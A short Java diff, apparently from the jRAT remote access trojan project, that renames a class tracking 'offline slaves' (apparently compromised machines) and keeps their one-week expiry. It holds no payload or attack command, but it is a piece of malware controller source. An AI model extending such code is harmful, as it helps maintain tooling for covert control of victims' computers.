@@ -19,13 +19,13 @@ import se.jrat.client.OfflineSlave;
 import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.common.crypto.KeyUtils;
 
-public class OfflineSlaves extends AbstractSettings {
+public class StoreageOfflineSlaves extends AbstractStoreable {
 	
 	private static final List<OfflineSlave> LIST = new ArrayList<OfflineSlave>();
-	private static final OfflineSlaves INSTANCE = new OfflineSlaves();
+	private static final StoreageOfflineSlaves INSTANCE = new StoreageOfflineSlaves();
 	private static final long TTL = 1000L * 60L * 60L * 24L * 7L;
 	
-	public static OfflineSlaves getGlobal() {
+	public static StoreageOfflineSlaves getGlobal() {
 		return INSTANCE;
 	}
 
